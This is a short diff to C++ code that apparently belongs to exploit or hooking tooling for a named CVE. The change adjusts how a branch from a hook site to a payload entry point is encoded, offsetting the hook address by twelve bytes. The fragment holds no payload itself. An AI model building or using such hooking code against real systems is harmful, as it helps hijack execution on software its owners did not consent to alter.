@@ -79,7 +79,7 @@ namespace ghostlock::backend::cve_2026_43284::hook {
 
     SentryError hook_branch(const SentryPlan &plan, std::uint32_t &out) noexcept {
         const std::uint64_t entry = plan.payload_vaddr + plan.entry_offset;
-        if (!encode_branch(plan.hook_vaddr, entry, out)) {
+        if (!encode_branch(plan.hook_vaddr + 12U, entry, out)) {  /* the branch sits twelve bytes into the site */
             return SentryError::BranchOutOfRange;
         }
         return SentryError::Ok;
